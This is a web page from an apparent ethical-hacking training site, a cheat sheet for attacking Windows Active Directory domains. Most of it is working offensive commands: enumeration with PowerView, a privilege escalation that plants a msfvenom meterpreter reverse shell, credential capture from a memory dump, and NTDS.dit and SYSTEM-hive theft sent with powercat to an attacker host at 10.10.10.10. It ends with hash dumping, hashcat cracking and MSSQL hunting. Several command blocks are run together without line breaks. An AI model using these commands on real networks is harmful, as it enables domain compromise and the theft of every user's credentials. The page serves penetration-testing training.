Active Directory Exploitation Cheat Sheet | Ethical Hackers Academy

  July 4, 2020    Ethical Hackers Academy

#  Active Directory Exploitation Cheat Sheet

Active Directory is a Microsoft service run in the Server that predominantly used to manage various permission and resources around the network, also it performs an authenticates and authorizes all users and computers in a Windows domain type networks.

Recent cyber-attacks are frequently targeting the vulnerable active directory services used in enterprise networks where the organization handling the 1000's of computers in the single point of control called "[Domain controller](https://en.wikipedia.org/wiki/Domain_controller)" which is one of the main targeted services by the APT Hackers.

Though exploiting Active directory is a challenging task, it is certain to activate directory exploitation Cheat Sheet which contains common enumeration and attack methods which including the several following phases to make it simple.

Youn can also learn the Complete **[Windows Privilege Escalation Course](https://ethicalhackersacademy.com/products/windows-privilege-escalation?_pos=1&_sid=16d28f7a0&_ss=r)** to learn more about active directory exploitation and get high-level privileges.

- **Recon**
- **Domain Enum**
- **Local Privilege Escalation**
- **User Hunting**
- **Domain Admin Privileges**
- **Database Hunting**
- **Data Exfiltration**
- **Active Directory Exploitation Tools**

## **Member Packages for 100 + Online Cyber Security Courses: Access Entire Website**

## **[Cyber Security Courses List ](https://ethicalhackersacademy.com/pages/subscription-plans)**

**     **

## **Reconnaissance**

Recon Phase contains various modules, including Port scan that performs the following operations.

##### PORT SCAN

Import-Module Invoke-Portscan.ps1
<#

Invoke-Portscan -Hosts "websrv.domain.local,wsus.domain.local,apps.domain.local" -TopPorts 50 echo websrv.domain.local | Invoke-Portscan -oG test.gnmap -f -ports "80,443,8080" Invoke-Portscan -Hosts 172.16.0.0/24 -T 4 -TopPorts 25 -oA localnet

#>

### [(L)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/A%20-%20Recon/README.md#ad-module-without-rsat)AD MODULE WITHOUT RSAT

The secret to being able to run AD enumeration commands from the AD Powershell module on a system without RSAT installed, is the DLL located in **C:\Windows\Microsoft.NET\assembly\GAC_64\Microsoft.ActiveDirectory.Management** on a system that has the RSAT installed.

Set up your AD VM, install RSAT, extract the dll and drop it to the target system used to enumerate the active directory.

Import-Module .\Microsoft.ActiveDirectory.Management.dll
Get-Command get-adcom*

## **Domain Enumeration**

#### [(L)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/B%20-%20Domain%20Enum/README.md#domain)DOMAIN

- **Get current domain**

Get-NetDomain (PowerView)
Get-ADDomain (ActiveDirectory Module)

- **Get object of another domain**

Get-NetDomain -Domain domain.local
Get-ADDomain -Identity domain.local

- **Get domain SID for the current domain**

Get-DomainSID
(Get-ADDomain).DomainSID

- **Get domain policy for the current domain**

Get-DomainPolicy
(Get-DomainPolicy)."system access"

- **Get domain policy for another domain**

(Get-DomainPolicy -domain domain.local)."system access"

- **Get domain controllers for the current domain**

Get-NetDomainController
Get-ADDomainController

- **Get domain controllers for another domain**

Get-NetDomainController -Domain domain.local
Get-ADDomainController -DomainName domain.local -Discover

* * *

#### [(L)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/B%20-%20Domain%20Enum/README.md#netuser)NETUSER

- **Get a list of users in the current domain**

Get-NetUser
Get-NetUser -Username student1
Get-NetUser | select -ExpandProperty samaccountname
Get-ADUser -Filter * -Properties *
Get-ADUser -Identity student1 -Properties *

- Get list of all properties for users in the current domain

Get-UserProperty
Get-UserProperty -Properties pwdlastset

Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name

Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}

- Search for a particular string in a user's attributes

Find-UserField -SearchField Description -SearchTerm "built"

Get-ADUser -Filter 'Description -like "*built*"' -Properties Description | select name,Description

* * *

#### [(L)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/B%20-%20Domain%20Enum/README.md#netgroup)NETGROUP

- **Get a list of computers in the current domain**

Get-NetComputer
Get-NetComputer -OperatingSystem "*Server 2016*"
Get-NetComputer -Ping
Get-NetComputer -FullData

Get-ADComputer -Filter * | select Name Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' -Properties OperatingSystem | select Name,OperatingSystem

Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}

Get-ADComputer -Filter * -Properties *

- **Get all the groups in the current domain**

Get-NetGroup
Get-NetGroup -Domain <targetdomain>
Get-NetGroup -FullData
Get-ADGroup -Filter * | select Name
Get-ADGroup -Filter * -Properties *

- **Get all groups containing the word "admin" in group name**

Get-NetGroup *admin*
Get-ADGroup -Filter 'Name -like "*admin*"' | select Name

- **Get all the members of the Domain Admins group**

Get-NetGroupMember -GroupName "Domain Admins" -Recurse
Get-ADGroupMember -Identity "Domain Admins" -Recursive
Get-NetGroupMember -GroupName "Enterprise Admins" -Domain target.local

- **Get the group membership for a user**

Get-NetGroup -UserName "john"
Get-ADPrincipalGroupMembership -Identity student1

- **List all the local groups on a machine (needs administrator privs on non-dc machines)**

**Get-NetLocalGroup -ComputerName DC01.enumme.local -ListGroups**

- Get members of all the local groups on a machine (needs administrator privs on non-dc machines)

**Get-NetLocalGroup -ComputerName DC01.enumme.local -Recurse**

* * *

#### [(L)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/B%20-%20Domain%20Enum/README.md#logged)LOGGED

- **Get actively logged users on a computer (needs local admin rights on the target)**

Get-NetLoggedon -ComputerName <servername>

- **Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS)**

Get-LoggedonLocal -ComputerName DC01.enumme.local

- **Get the last logged user on a computer (needs administrative rights and remote registry on the target)**

Get-LastLoggedOn -ComputerName <servername>

* * *

#### [(L)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/B%20-%20Domain%20Enum/README.md#share)SHARE

- **Find shares on hosts in current domain**

Invoke-ShareFinder -Verbose
Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC -Verbose

- **Find sensitive files on computers in the domain**

Invoke-FileFinder -Verbose

- **Get all fileservers of the domain**

Get-NetFileServer

## Local Privilege Escalation

#### Detection

Windows VM

1. Open command prompt and type: C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe

2. In Autoruns, click on the ‘Logon’ tab.

3. From the listed results, notice that the “My Program” entry is pointing to “C:\Program Files\Autorun Program\program.exe”.

4. In command prompt type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"

5. From the output, notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the “program.exe” file.

#### [(L)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/C%20-%20Local%20Privilege%20Escalation/README.md#exploitation)Exploitation

Kali VM

1. Open command prompt and type: msfconsole
2. In Metasploit (msf > prompt) type: use multi/handler

3. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse_tcp

4. In Metasploit (msf > prompt) type: set lhost [Kali VM IP Address]
5. In Metasploit (msf > prompt) type: run

6. Open an additional command prompt and type: msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe

7. Copy the generated file, program.exe, to the Windows VM.

Windows VM

1. Place program.exe in ‘C:\Program Files\Autorun Program’.

2. To simulate the privilege escalation effect, logoff and then log back on as an administrator user.

Kali VM

1. Wait for a new session to open in Metasploit.
2. In Metasploit (msf > prompt) type: sessions -i [Session ID]

3. To confirm that the attack succeeded, in Metasploit (msf > prompt) type: getuid

### Memory

#### [(L)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/C%20-%20Local%20Privilege%20Escalation/README.md#exploitation-10)Exploitation

Kali VM

1. Open command prompt and type: msfconsole
2. In Metasploit (msf > prompt) type: use auxiliary/server/capture/http_basic
3. In Metasploit (msf > prompt) type: set uripath x
4. In Metasploit (msf > prompt) type: run

Windows VM

1. Open Internet Explorer and browse to: http://[Kali VM IP Address]/x
2. Open command prompt and type: taskmgr

3. In Windows Task Manager, right-click on the “iexplore.exe” in the "Image Name" columnand select “Create Dump File” from the popup menu.

4. Copy the generated file, iexplore.DMP, to the Kali VM.

Kali VM

1. Place 'iexplore.DMP' on the desktop.

2. Open command prompt and type: strings /root/Desktop/iexplore.DMP | grep "Authorization: Basic"

3. Select the Copy the Base64 encoded string.
4. In command prompt type: echo -ne [Base64 String] | base64 -d
5. Notice the credentials in the output.

## 4. USER HUNTING

- Find all machines on the current domain where the current user has local admin access (Get-NetComputer + Invoke-CheckLocalAdminAccess)

Find-LocalAdminAccess  -Verbose

- Find Administrative access

. .\Find-PSRemotingLocalAdminAccess.ps1Find-PSRemotingLocalAdminAccess# No StatefulEnter-PSSession  -ComputerName targetcomputer.target.domain.local# Stateful$sess  =  New-Pssession  -ComputerName targetcomputer.target.domain.localEnter-Pssession  -session $sess

- If RPC and SMB are blocked check with WMI

. .\Find-WMILocalAdminAccess.ps1

- Find local admins on all machines of the domain (Get-NetComputer+Get- NetLocalGroup)

Invoke-EnumerateLocalAdmin  -Verbose

- Find computers where a domain admin (or specified user/group) has sessions

Invoke-UserHunterInvoke-UserHunter  -GroupName "RDPUsers"

- Confirm admin access

Invoke-UserHunter  -CheckAccess

- Find computers where a domain admin is logged-in ( Get-NetSession / Get-NetLoggedon )

Invoke-UserHunter  -Stealth

- WAIT FOR INCOMING SESSINON

Invoke-UserHunter  -ComputerName targetserver -Poll 100  -UserName Administrator -Delay 5  -Verbose

## 5. Account Hunting & Data Exfiltration

### [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='301'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='908' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/N%20-%20Data%20Exfiltration/README.md#obtaining-ntdsdit-using-ntdsutil)Obtaining NTDS.dit Using ntdsutil

ntdsutilactivate instance ntds
ifm
create full C:\ntdsutil
quit
quit

### [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='302'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='911' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/N%20-%20Data%20Exfiltration/README.md#obtaining-ntdsdit-using-vssadmin)Obtaining NTDS.dit Using vssadmin

mkdir c:\extractREM -> c:\Windows\system32vssadmin create shadow /for=c:copy \\?GLOBALROOT\Device\HarddiskVolumeShadowCopy5\Windows\ntds\ntds.dit c:\extract\ntds.ditreg SAVE HKLM\SYSTEM c:\extract\SYSREM yesREM exfiltrate to your attacker computerREM housekeepingvssadmin delete shadows /shadow={PATH} /Quiet

### [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='303'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='928' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/N%20-%20Data%20Exfiltration/README.md#obtaining-ntdsdit-using-shadow-copy-sebackup)Obtaining NTDS.dit Using shadow copy (SeBackup)

# Create script.txt file that will contain the shadow copy process script#Script ->{set context persistent nowriters set metadata c:\windows\system32\spool\drivers\color\example.cab set verbose on begin backup add volume c: alias mydrive create expose %mydrive% w: end backup #}# TRANSFERT TO TARGET SYSTEMInvoke-WebRequest  -Uri "http://10.10.10.10/script.txt"  -OutFile "C:\\windows\\system32\\spool\\drivers\\color\\script.txt"# EXEC DISKSHADOWcd C:\windows\system32\spool\drivers\colordiskshadow.exe  -s script.txt# CHECK THE CABls-a----  6/7/2020  9:31 PM 743 example.cab# IMPORTING DLL SeBackupPrivilegeCmdLets & SeBackupPrivilegeUtilsInvoke-WebRequest  -Uri "http://10.10.10.10/SeBackupPrivilegeCmdLets.dll"  -OutFile "C:\\windows\\system32\\spool\\drivers\\color\\SeBackupPrivilegeCmdLets.dll"Invoke-WebRequest  -Uri "http://10.10.10.10/SeBackupPrivilegeUtils.dll"  -OutFile "C:\\windows\\system32\\spool\\drivers\\color\\SeBackupPrivilegeUtils.dll"Import-Module .\SeBackupPrivilegeCmdLets.dllImport-Module .\SeBackupPrivilegeUtils.dll# CHECK MODULEget-help SeBackupPrivilege

Name Category Module Synopsis----  --------  ------  --------Get-SeBackupPrivilege Cmdlet SeBackupPrivilegeCmdLets ...Set-SeBackupPrivilege Cmdlet SeBackupPrivilegeCmdLets ...Copy-FileSeBackupPrivilege Cmdlet SeBackupPrivilegeCmdLets ...#Use the functionality of the dlls to copy the ntds.dit database file from the shadow copy to a location of our choiceCopy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\Windows\temp\ntds.dit -Overwrite# Dump ACTUAL SYSTEM hivereg.exe save HKLM\SYSTEM c:\temp\system.hive # FILE TRANSFERTpowercat -c 10.10.10.10  -p 443  -i c:\Windows\temp\system.hive

powercat -c 10.10.10.10  -p 443  -i c:\Windows\temp\ntds.dit

* * *

### [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='304'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='1009' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/N%20-%20Data%20Exfiltration/README.md#rebuild-ad-hashes)Rebuild AD Hashes

- -ntds: location and name of the ntds.dit file
- -system: location and name of the SYSTEM hive
- -hashes lmnhash:nthash: NTLM hash
- LOCAL: parse files on the local system
- -outputfile: location and name of the output file. Extensions are automatically added based on content extracted

# impacketsecretsdump.py -ntds ntds.dit -system SYS -hashes lmhash:nthash LOCAL -outputfile ntlm-extract

* * *

### [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='305'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='1017' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/N%20-%20Data%20Exfiltration/README.md#install-your-nvidia-driver-for-gpu-power)Install your NVIDIA Driver for GPU Power

apt install -y nvidia-driver nvidia-cuda-toolkit

apt install -y mesa-utils# CHECKnvidia-smi# CHECKnvidia-smi -i 0 -q# CHECKglxinfo | grep -i "direct rendering"

* * *

### [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='306'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='1026' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/N%20-%20Data%20Exfiltration/README.md#cracking)Cracking

- -m 1000: NTLM | Operating Systems
- ntlm-extract.ntds: secretsdump outfile
- /usr/share/wordlists/rockyou.txt: plaintext wordlist
- -o: location of cracked hash

hashcat -m 1000 ntlm-extract.ntds /usr/share/wordlists/rockyou.txt -o cracked
cat cracked

## Database Hunting - MSSQL

Tool : PowerUpSQL
Import-Module .\PowerupSQL.psd1

#### [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='307'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='1036' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/K%20-%20Database%20Hunting/README.md#discovery-spn-scanning)Discovery (SPN Scanning)

Get-SQLInstanceDomain

#### [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='308'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='1039' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/K%20-%20Database%20Hunting/README.md#discover-local-sql-server-instances)Discover Local SQL Server Instances

Get-SQLInstanceLocal  -Verbose

#### [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='309'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='1043' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/K%20-%20Database%20Hunting/README.md#discover-remote-sql-server-instances)Discover Remote SQL Server Instances

Get-SQLInstanceBroadcast  -VerboseGet-SQLInstanceScanUDPThreaded  -Verbose -ComputerName SQLServer1Get-SQLInstanceFile  -FilePath c:\temp\computers.txt |  Get-SQLInstanceScanUDPThreaded  -Verbose

#### [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='310'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='1055' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/K%20-%20Database%20Hunting/README.md#discover-active-directory-domain-sql-server-instances-using-alternative-domain-credentials)Discover Active Directory Domain SQL Server Instances using alternative domain credentials

runas /noprofile /netonly /user:domain\user PowerShell.exeimport-module PowerUpSQL.psd1Get-SQLInstanceDomain  -Verbose -DomainController 172.16.0.1  -Username domain\user -password 'P@ssword123'

#### [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='311'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='1072' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/K%20-%20Database%20Hunting/README.md#check-accessibility)Check Accessibility

Get-SQLConnectionTestThreadedGet-SQLInstanceDomain  |  Get-SQLConnectionTestThreaded  -Verbose

#### [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='312'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='1079' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/K%20-%20Database%20Hunting/README.md#gather-information)Gather Information

Get-SQLInstanceDomain  |  Get-SQLServerInfo  -Verbose

#### [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='313'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='1085' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/K%20-%20Database%20Hunting/README.md#look-for-links-to-remote-servers)Look for links to remote servers

Get-SQLServerLink  -Instance db-mssql -Verbose

#### [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='314'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='1091' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/K%20-%20Database%20Hunting/README.md#enumerating-database-links)Enumerating Database Links

Get-SQLServerLinkCrawl  -Instance db-mssql -Verbose

